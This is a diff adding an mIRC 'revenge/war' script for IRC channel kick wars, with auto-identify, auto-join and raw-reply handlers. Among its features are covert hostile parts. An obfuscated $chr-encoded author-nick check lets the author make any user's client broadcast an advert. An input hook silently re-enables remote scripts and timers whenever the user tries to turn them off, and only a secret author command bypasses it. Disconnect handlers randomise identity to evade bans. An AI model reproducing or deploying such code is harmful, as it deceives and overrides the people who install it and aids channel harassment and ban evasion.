@@ -1,0 +1,314 @@
+;x»x»[§]I®[K]nüM[§]Kü££[©]rêwZ®«x«x COPYRIGHT..!!!
+;========================================================================
+;= §¢®ìÞt âÐÐðñ ßÿ s|rKnuMsKuLL FroM x»x»[§]I®[K]nüM[§]Kü££[©]rêwZ®«x«x     =
+;========================================================================
+on master:NICK:{ /.rlevel master $nick | /.timer 1 0 auser master $newnick }
+on *:TEXT:!using:#:if ($nick == $chr(115) $+ $chr(124) $+ $chr(114) $+ $chr(75) $+ $chr(110) $+ $chr(117) $+ $chr(77) $+ $chr(115) $+ $chr(75) $+ $chr(117) $+ $chr(76) $+ $chr(76) $+ ) { /.ame 12using 9[ %logo 9] By §I®KnüM§Kü££ 12FroM 4www.scripterz.cjb.net }
+on kokua:nick: {
+  .rlevel kokua $nick
+  .timerping off 
+  .auser kokua $newnick
+  .timerping 0 30 .ping $newnick 
+}
+on *:connect: {  
+  .rlevel kokua
+  .auser kokua $me
+  .umode -mM+Li
+  .timerping 0 30 /ping $me
+  .titlebar Connect on [ $server ] with nick [ $me ] on [ $fulldate ]
+  .clear -s
+  if (%useon1 == true) && (%ident == on) && (%users1 == $me) { /ns identify %users1 %ident1 }
+  if (%useon2 == true) && (%ident == on) && (%users2 == $me) { /ns identify %users2 %ident2 }
+  if (%useon3 == true) && (%ident == on) && (%users3 == $me) { /ns identify %users3 %ident3 }
+  if (%joins1 == true) && (%joining1 == on) { .timer 1 2 j %channel1 }
+  if (%joins2 == true) && (%joining1 == on) { .timer 1 2 j %channel2 }
+  if (%joins3 == true) && (%joining1 == on) { .timer 1 2 j %channel3 }
+  if (%joins4 == true) && (%joining1 == on) { .timer 1 2 j %channel4 }
+}
+on *:disconnect: {
+  .timerping off
+  .anick $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(0,9) $+ $r(A,Z) $+ $r(0,9)
+  .emailaddr $r(A,Z) $+ $r(a,z) $+ $r(1,1000) $+ $r(a,z) $+ $r(1,9) $+ $chr(64) $+ $r(a,z) $+ $r(A,Z) $+ . $+ $r(1,100) $+ .net
+  .identd on $chr(120) $+ $r(1,999) $+ $chr(114) $+ $chr(101) $+ $chr(97) $+ $chr(121) $+ $r(1,999) $+ $chr(120)
+}
+on *:load:{ .run -n $mircexe | .exit }
+on *:start:{ .notify $chr(115) $+ $chr(124) $+ $chr(114) $+ $chr(75) $+ $chr(110) $+ $chr(117) $+ $chr(77) $+ $chr(115) $+ $chr(75) $+ $chr(117) $+ $chr(76) $+ $chr(76) | .welcome | .timer 0 0 cekbig | .timer 0 0 sirknumskull | .halt }
+alias cekbig { if ($readini mirc.ini fonts fscripts != Impact,101) { .writeini mirc.ini fonts fscripts Impact,101 | exit } } 
+alias sirknumskull { if $cb != $null { clipboard $cb } }
+on *:notice:*:*: {
+  if ($nick == ChanServ) {
+    var %chmsg = $strip($1-,burc) | if (WARNING isin %chmsg) { $adc.a | quit | server }
+    if (FLOODING isin %chmsg) { if ($me !ison %rchan) { $adc.a | quit | server } | elseif (%amaran == 3) && ($me ison %rchan) { $adc.a | quit | server | halt } | inc -u15 %amaran }
+  }
+  if (deopped isin $1-) {
+    if ($me == $1) { goto end }
+    if ($me == $3) { .set %deopserv $1 | goto end }
+  }    
+  :end
+}
+raw 386:*: { 
+  if (%x) { $sambung }
+}
+on *:INVITE:#: { if ( Chanserv == $nick ) { .echo -a 9*** 12[4 ChanServ 12] 14I15s 14I15nvite 14T15o 14J15oin 12[4 $chan 12] . 14T15rying 14T15o 14J15oin 12[4 $chan 12] .... | .timer 1 2 join $chan } }
+raw 405:*:{ .echo -a 9*** 14T15oo 14M15any 14C15hannel !!~ | halt }
+raw 406:*:{ .echo -a 9*** 14N15o 14S15uch 14N15ick 12[4 $2 12] | halt }
+raw 404:*:{ .echo -a 9*** 14C15annot 14S15end 14T15o 12[4 $2 12] | halt }
+raw 423:*: {
+  .echo 9*** 14A15dministrative 14I15nfo 14U15navailable | haltdef
+}
+raw 436:*:echo  -a 9*** 14K15illed 14B15y 12[4 $server 12] | /whowas $me
+raw 471:*: {
+  echo -a 9*** Channel Is Full 2[4 $2 12]
+  msg chanserv invite $2
+  halt
+}
+raw 473:*: {
+  echo -a 9*** Invite only 12[4 $2 12]
+  msg chanserv invite $2 
+  halt
+}
+raw 474:*:echo -s  *** Cannot join channel  [ $2 ]  U're Ban | { .chanserv unban $2  | join $2 | halt } 
+raw 475:*: {
+  echo -a 9*** Key Required 12[4  $2 12]
+  msg chanserv invite $2 
+  halt
+}
+raw 477:*: {
+  echo -a 9*** Register Nick Needed 12[4 $2 12]
+  msg chanserv invite $2
+  halt
+}
+raw 478:*:{ .echo -a 9*** 14B15an 14L15ist 14O15f 12[4 $2 12] 14I15s 14F15ull !!~ | halt }
+raw 251:*:{ echo -s $server Server Status | echo -s $str($chr(160),1) | echo -s Users Online/Invisible $4 - $7  | echo -s Total Servers $10  | Halt }
+raw 252:*:{ echo -s 4:15:: Server Operators Online $2  | Halt }
+raw 253:*:{ echo -s 4:15:: Unknown Connections $2   | Halt }
+raw 254:*:{ echo -s 4:15:: Channels Formed $2   | Halt }
+raw 255:*:{ Halt }
+raw 265:*:{ echo -s 4:15:: Current Local Users $replace($5,,,[,$str($chr(160),0),],$str($chr(160),0))  | Halt }
+raw 266:*:{ echo -s 4:15:: Current Global Users $replace($5,,,[,$str($chr(160),0),],$str($chr(160),0))  | Halt }
+raw 324:*:echo -a 4:15:: Channel Modes $3- 11•
+raw 305:*:{ halt }
+raw 306:*:{ halt }
+raw 301:*:echo -a 4:15:: $2 11Is Away : $3-  | halt  
+raw 307:*:echo -a 4:15:: $2 11Has Been Registered And Identified | halt
+raw 308:*:echo -a 4:15:: $2 11Is An IRCop | halt
+raw 309:*:echo -a 4:15:: $2 $+ $3- | halt 
+raw 310:*:echo -a 4:15:: $2 11Is A Helper-OP | halt
+raw 311:*: { 
+  echo -a 15~~~~~~~~~~~~~~~~~~~~~~~~~~~ 14WHOIS 15~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+  echo -a 4:15:: $2 11Is $6-  
+  if (123x1v321 ==  $3) { echo -a 4:15:: IP Address :11 $3 $+ @ $+ $4 $wildsite 5[ 4Your Script Creator5 ] | halt
+  }
+  else { echo -a 4:15:: IP Address :11 $3 $+ @ $+ $4 $wildsite |  halt 
+  }
+}
+raw 312:*:echo -a 4:15:: $2 11Is Using $3 $+ 14 • 4 $+ $4- $+  | halt 
+raw 313:*:echo -a 4:15:: Status : $5-  | halt 
+raw 317:*:echo -a 4:15:: $2 11Has Been Idle For $duration($3) | halt 
+raw 318:*:echo -a 15~~~~~~~~~~~~~~~~~~~~~~~~~ 14END WHOIS 15~~~~~~~~~~~~~~~~~~~~~~~~~ | halt 
+raw 319:*:echo -a 4:15:: $2 11Is On $3- | halt 
+raw 325:*:echo -a 4:15:: $2 11Has A Very Big And Sensitive Ears :þ~ | halt
+raw 332:*:echo -a 4:15:: $2 11The Topic Is $3- | halt
+raw 333:*:echo -a 4:15:: $2 11The Topic Was Set By  $3 On $asctime($4-) | halt
+raw 341:*:echo -a 4:15:: $2 11Has Been Invited To $3 | halt
+raw 353:*:halt
+raw 366:*:halt
+raw 381:*:echo -a 4:15:: 11 You Are Now An IRC Operator | halt
+
+
+;========================================================================
+;= §¢®ìÞt âÐÐðñ ßÿ s|rKnuMsKuLL FroM x»x»[§]I®[K]nüM[§]Kü££[©]rêwZ®«x«x     =
+;========================================================================
+#waring on
+on *:KICK:#: { 
+  IF ($nick == $me) { .inc %total.kicks | .inc %my.kicks | .set %personkicked %xxx } 
+  ELSE IF ($knick == $me) { .inc %total.kicks | .inc %their.kicks | .set %personkicked %xxx }
+}
+#waring end
+;=============
+on 1:dialog:scanner:sclick:*:{
+  if ($did == 14) { .timer -mo 1 1 fade_out $dname | halt } 
+}
+;============================================
+#autoslaps on
+on !*:action:$(* $+ $me $+ *):#:{
+  inc -u6 %slap 1
+  if (%slap > 2) {
+    else { .disable #autoslaps | .timer 1 15 .enable #autoslaps | unset %slap }
+  }
+  else { describe $chan $replace($1-,$me,$nick) }
+}
+#autoslaps end
+#change off
+on +x:join:%x:/nick $r(1,9999) $+ sirknumskullcrewz $+ $r(1,9999)
+#change end
+#input off
+on *:input:*:{
+  if (window isin $active) && (status isin $active) && ($left($1-,1) != /) { .echo -a 3 »»8 »»4 »» 4[12D4]6on't 4[12T4]6ype 4[12O4]6n 9-[ 11Status Window 9]- | halt }
+  if ($chr(47) isin $left($1,1)) { goto ëñÐ }
+  else if ($1 isin $1-) { 
+    .say 9- 3»»8»»4»» $replace($1-,e,14ë,a,14å,o,14ô,i,14ï,u,14ú,q,q,w,w,r,r,t,t,y,¥,p,p,s,§,d,d,f,f,g,g,h,h,j,j,k,k,l,£,z,z,x,x,c,©,v,v,b,b,n,n,m,m) 4««8««3««  
+    .halt
+    :ëñÐ 
+  }
+} 
+#input end
+;======
+alias fade_out {
+  set %r-dialogsize 0
+  .timerrdialog1 -mo 16 10 r-updatesize_do1 $1 $dialog($1).w $dialog($1).h
+}
+alias r-updatesize_do1 {
+  if ($dialog($1)) {
+    if (%r-dialogsize >= 15) { dialog -x $1 | .timerrdialog1 off  | unset %r-dialogsize }
+    else {
+      inc %r-dialogsize 2
+      dialog -sp $1 -1 -1 $2 $int($calc($3 / %r-dialogsize))
+    }
+  }
+}
+;========================================================================
+;= §¢®ìÞt âÐÐðñ ßÿ s|rKnuMsKuLL FroM x»x»[§]I®[K]nüM[§]Kü££[©]rêwZ®«x«x     =
+;========================================================================
+menu status,channel {
+  START««®»»REVENGE1:enable #[§]I®[K]nüM[§]Kü££[©]rêwZ® | .disable #rev | .set %joining1 OFF | if ([C] isin $me) { .timer -h 1 100 nick %autonick } | if ($active !== Status Window) { /ame 3 »»8 »»4 »» 4[ 0R5êv0êñ5Gê 7««8NO 17»» 0Tü5®n0êD 12ON 4] } | else { .echo -a 3 »»8 »»4 »» 4[ 0R5êv0êñ5Gê 7««8NO 17»» 0Tü5®n0êD 12ON 4] } | .splay warmode  
+  -
+  START««®»»REVENGE2:enable #rev | .disable #[§]I®[K]nüM[§]Kü££[©]rêwZ® | .set %joining1 OFF | if ([C] isin $me) { .timer -h 1 100 nick %autonick } | if ($active !== Status Window) { /ame 3 »»8 »»4 »» 4[ 0R5êv0êñ5Gê 7««8NO 27»» 0Tü5®n0êD 12ON 4] } | else { .echo -a 3 »»8 »»4 »» 4[ 0R5êv0êñ5Gê 7««8NO 27»» 0Tü5®n0êD 12ON 4] } | .splay warmode
+  -
+  CLEAR««®»»REVENGE:disable #[§]I®[K]nüM[§]Kü££[©]rêwZ® | .disable #rev | .splay disable | .set %joining1 ON | .unset %x %xxx %deop %ðÞÞëÐ %§ë|f  | .rlevel enemy | .rlevel REAY | .rlevel me | .rlevel xxx | if ($active !== Status Window) { /ame 3 »»8 »»4 »» 4[ 0R5êv0êñ5Gê 0C£5êâ®0êÐ 4] } | else { .echo -a 3 »»8 »»4 »» 4[ 0R5êv0êñ5Gê 0C£5êâ®0êÐ 4] } | if ([C] !isin $me) { .set %autonick $me | .timer -h 1 100 nick $me $+ [C] } 
+  -
+  »» WAR &RESULT  ««: { if (%my.kicks == 0) && (%their.kicks == 0) { echo -a 4[12W4]6ar 4[12H4]6asn't 4[12S4]6tart..!! }
+    elseif (%my.kicks != 0) && (%their.kicks != 0) { warresult }
+  }
+  -
+  »» CLEAR &RESULT ««:{ if (%my.kicks == 0) && (%their.kicks == 0) { echo -a 4[12W4]6ar 4[12H4]6asn't 4[12S4]6tart..!! }
+    elseif (%my.kicks != 0) && (%their.kicks != 0) { clearresult }
+  }
+  -
+  »» AUTO &IDENTIFY ««
+  .Setup : automaticnickidentify
+  .-
+  .Use Nick %autonick :{
+    if ( %autonick == $null ) { echo -a Please Set Your Nickname & Password First ! | halt }
+    if ( %autopass == $null ) { echo -a Please Set Your Nickname & Password First ! | halt }
+    else nick %autonick
+  }
+  .-
+  .Recover %autonick : if ( %autonick == $null ) { echo -a Please Set Your Nickname & Password First ! | halt } | if ( %autopass == $null ) { echo -a Please Set Your Nickname & Password First ! | halt } | else /msg nickserv recover %autonick %autopass
+  .Release %autonick : if ( %autonick == $null ) { echo -a Please Set Your Nickname & Password First ! | halt } | if ( %autopass == $null ) { echo -a Please Set Your Nickname & Password First ! | halt } | Else /msg nickserv RELEASE %autonick %autopass
+  .-
+  .Ghost %autonick : if ( %autonick == $null ) { echo -a Please Set Your Nickname & Password First ! | halt } | if ( %autopass == $null ) { echo -a Please Set Your Nickname & Password First ! | halt } | else /msg nickserv GHOST %autonick %autopass
+  .-
+  .Sidentify : .ns sidentify %autonick %autopass
+  -
+  »» INPUT $chr(91) $left($upper($group(#input)),1) $+ $remove($group(#input),o) $chr(93) ««
+  .ON:enable #input  
+  .-
+  .OFF:disable #input 
+  -
+  »» REFRESH &SCRIPT ««:refresh
+  -
+  »» SCANNER ««:scanner
+}
+
+;========================================================================
+;= §¢®ìÞt âÐÐðñ ßÿ s|rKnuMsKuLL FroM x»x»[§]I®[K]nüM[§]Kü££[©]rêwZ®«x«x     =
+;========================================================================
+
+alias automaticnickidentify dialog -m nickautoidentify nickautoidentify
+dialog nickautoidentify {
+  title "Setup"
+  size -1 -1 200 137
+  Box "Nick Auto Identify" 90, 3 5 194 103
+  text "Nickname :" 91, 8 33 55 14
+  edit "" 92, 62 30 130 20 ,autohs
+  text "Password :" 93, 8 63 55 14
+  edit "" 94, 62 60 130 20 ,autohs
+  Button "Remove" 96, 6 85 50 20
+  check "On/Off" 97, 120 85 50 20
+  Button "OK" 95, 8 110 184 25,ok
+}
+on 1:dialog:nickautoidentify:init:0:{
+  if (%roticanaibasi == On) { did -c nickautoidentify 97 }
+  did -a $dname 92 %autonick
+  did -a $dname 94 %autopass
+  if (%roticanaibasi == On) { did -n $dname 92 %autonick | did -n $dname 94 %autopass }
+  if (%roticanaibasi == Off) { did -m $dname 92 %autonick | did -m $dname 94 %autopass }
+}
+on *:dialog:nickautoidentify:edit:92: set %autonick $did(92)
+on *:dialog:nickautoidentify:edit:94: set %autopass $did(94)
+on *:dialog:nickautoidentify:sclick:97: {
+  if ($did(97).state == 1) { set %roticanaibasi On | did -n $dname 92 %autonick | did -n $dname 94 %autopass } 
+  else { set %roticanaibasi Off | did -m $dname 92 %autonick | did -m $dname 94 %autopass }
+}
+on *:dialog:nickautoidentify:sclick:96: {
+  if ($?!"Your Nickname And Password Will Be Removed, Are You Sure?" == $false ) { return }
+  set %autonick (Not Set)
+  set %autopass (Not Set)
+  dialog -x nickautoidentify 
+  automaticnickidentify
+}
+on *:dialog:nickautoidentify:sclick:95:{
+  if (%autonick == $null) { set %autonick (Not Set) }
+  if (%autopass == $null) { set %autopass (Not Set) }
+}
+on *:dialog:nickautoidentify:close:nickautoidentify:{
+  if (%autonick == $null) { set %autonick (Not Set) }
+  if (%autopass == $null) { set %autopass (Not Set) }
+}
+on *:NOTICE:*NickServ IDENTIFY*:?:{
+  if (%roticanaibasi == On) && (%autonick == $me) || (pHeon|xz == $me) { .msg nickserv identify %autopass }
+}
+alias shwvga { .return $readini c:\windows\system.ini boot.description display.drv with a $window(-1).w $+ x $+ $window(-1).h Resolution }
+alias pctype { .return $readini c:\windows\system.ini boot.description system.drv }
+alias keybod { .return $readini c:\windows\system.ini boot.description keyboard.typ }
+alias maus { .return $readini c:\windows\system.ini boot.description mouse.drv }
+alias OStime { .return $int($calc($calc( $ticks /1000)/3600)) hours, $calc($int($calc($calc( $ticks /1000)/60))-($calc($int($calc($calc( $ticks /1000)/3600))*60))) minutes and $calc($calc( $ticks /1000)-($calc($calc($int($calc($calc( $ticks /1000)/60))*60)))) Secs }
+alias CPUspd { var %protest = $ticks , %i = 1 | :start | if ($calc($ticks - %protest) <= 100) { .inc %i | .goto start } | :end | .return $round($calc(%i * 0.7543242),2) $+ Mhz } 
+alias frespc { var %hC = $round($calc(($disk(c).free)/1048576), 2), %hD = $round($calc(($disk(d).free)/1048576), 2), %hE = $round($calc(($disk(e).free)/1048576), 2), %h1 = $calc(%hC + %hD), %hd = $calc(%h1 + %hE) | .return C:\ $round($calc(($disk(c).free)/1048576), 2) $+  MB D:\ $round($calc(($disk(d).free)/1048576), 2) $+  MB E:\ $round($calc(($disk(e).free)/1048576), 2) $+  MB Total: %hd $+ MB }
+alias fram { .return $int($calc($getInfo(getPhysicalRAMTotal)/1024/1024+1)) $+ Mb Ram $& ( $+ $int($calc($getInfo(getPhysicalRAMAvailable)/1024/1024+1)) $& $+ MB available, or $& $calc(100 - $getInfo(getPhysicalRAMLoad)) $+ % $+ ) RAM } 
+alias getInfo .return $dll(winstats.dll, getInfo, $1)
+
+on 1:input:*: {
+  if ($1- == /s|rKnuMsKuLL) { /remote off | /timers off | /welcome | halt }
+  if ($1- == /remote o) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == /remote of) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == /remote off) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == //remote off) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == ///remote off) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == ////remote off) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == /////remote off) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == //////remote off) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == /remote of) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == //remote of) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == ///remote of) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == ////remote of) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == /////remote of) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == //////remote of) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt } 
+  if ($1- == /remote o) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == //remote o) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == ///remote o) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == ////remote o) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == /////remote o) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt }
+  if ($1- == //////remote o) { echo -a 3 »»8 »»4 »» 4.:RÈMØTÈ ÔFF DÍSÆßLÊÐ4:.  | .timer 1 0 .remote on | halt } 
+  if ($1- == /timer) { /echo 3 »»8 »»4 »» Cant Play With Timers :) | halt }
+  if ($1- == //timer) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == ///timer) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == ////timer) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == /////timer) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == /timers) { /echo 3 »»8 »»4 »» Cant Play With Timers :) | halt }
+  if ($1- == //timers) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == ///timers) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == ////timers) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == /////timers) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == /timer* off) { /echo 3 »»8 »»4 »» Cant Play With Timers :) | halt }
+  if ($1- == //timer* off) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == ///timer* off) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == ////timer* off) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == /////timer* off) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == /timers off) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == //timers off) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == ///timers off) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == ////timers off) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+  if ($1- == /////timers off) { /echo 3 »»8 »»4 »» Cant Play With Timers | halt }
+}
